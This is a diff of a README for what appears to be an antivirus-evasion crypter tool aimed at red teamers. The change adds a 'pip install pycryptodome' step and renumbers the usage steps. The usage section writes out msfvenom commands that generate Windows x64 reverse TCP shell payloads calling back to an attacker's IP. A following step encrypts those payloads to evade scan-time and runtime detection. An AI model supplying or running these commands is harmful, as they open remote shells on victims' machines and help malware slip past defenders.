@@ -22,7 +22,11 @@ This tool is ideal for red teamers, penetration testers, or researchers who want
 
 ## 🚀 Usage
 
-### 1. Generate your payload
+### 1. Install the dependencies
+
+- `pip install pycryptodome`
+
+### 2. Generate your payload
 
 - For runtime:
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o payload.bin`
@@ -30,7 +34,7 @@ This tool is ideal for red teamers, penetration testers, or researchers who want
 - For scantime:
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o payload.exe`
 
-### 2. Encrypt your payload
+### 3. Encrypt your payload
 
 - `python.exe scantime/runtime.py payload.exe/.bin`
 
